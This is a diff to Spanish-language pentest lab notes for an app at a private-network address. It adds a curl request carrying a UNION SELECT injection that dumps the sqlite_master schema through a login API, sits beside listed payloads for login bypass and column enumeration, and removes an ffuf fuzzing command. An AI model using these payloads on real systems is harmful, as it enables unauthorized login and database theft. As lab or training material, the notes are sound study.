@@ -23,6 +23,9 @@ PAYLOAD 1 — Bypass de autenticación (OR clásico):
           El comentario -- elimina la verificación de contraseña.
   Resultado: Login como el primer usuario de la tabla.
 
+Ejemplo de ejecución manual con curl (Fase de Entrega):
+  curl -X POST http://192.168.56.20:4000/api/login -H "Content-Type: application/json" \
+  -d '{"username": "admin''' UNION SELECT 1, sql, 3 FROM sqlite_master --", "password": "123"}'
 PAYLOAD 2 — UNION SELECT para enumerar columnas:
   username = ' UNION SELECT 1,2,3,4,5--
   Efecto: Confirma que la tabla users tiene 5 columnas.
@@ -135,14 +138,8 @@ Comando Hashcat en Kali Linux:
   Sin salt → determinista → rainbow tables funcionan directamente.
 
 ================================================================================
- FASE I: RECONOCIMIENTO — Comando ffuf
+ FASE I: RECONOCIMIENTO — Interacción manual
 ================================================================================
-
-En Kali Linux (alternativa al script Python):
-  ffuf -u http://192.168.56.20:4000/FUZZ \
-       -w /usr/share/wordlists/dirb/common.txt \
-       -mc 200,401,403,405 \
-       -t 10
 
 Descubrimiento manual de cabeceras:
   curl -v http://192.168.56.20:4000/api/login 2>&1 | grep -E "X-Powered-By|Set-Cookie"
